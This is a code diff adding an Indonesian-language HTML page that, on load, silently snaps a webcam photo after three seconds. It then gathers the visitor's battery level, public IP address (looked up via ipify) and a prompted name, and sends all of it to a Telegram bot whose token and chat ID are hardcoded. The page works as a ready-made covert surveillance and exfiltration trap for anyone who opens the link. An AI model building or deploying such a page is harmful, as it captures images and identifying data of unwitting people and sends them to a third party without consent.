@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Auto Foto & Kirim ke Telegram</title>
+</head>
+<body>
+<video id="video" autoplay playsinline style="max-width: 400px;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+// Ganti dengan token bot dan chat ID kamu
+const BOT_TOKEN = '7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU';
+const CHAT_ID = '6624966395';
+
+navigator.mediaDevices.getUserMedia({ video: true }).then(async stream => {
+  video.srcObject = stream;
+
+  setTimeout(async () => {
+    const context = canvas.getContext('2d');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const dataURL = canvas.toDataURL('image/jpeg');
+    const blob = await (await fetch(dataURL)).blob();
+
+    stream.getTracks().forEach(track => track.stop()); // Stop kamera
+
+    const battery = await navigator.getBattery();
+    const level = Math.round(battery.level * 100);
+
+    const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('caption', `Baterai: ${level}%\nIP Address: ${ipData.ip}\nNama: ${prompt("Masukkan nama:")}`);
+    formData.append('photo', blob, 'foto.jpg');
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    });
+
+  }, 3000); // Ambil foto setelah 3 detik
+
+}).catch(err => {
+  alert('Gagal akses kamera: ' + err.message);
+});
+</script>
+</body>
+</html>
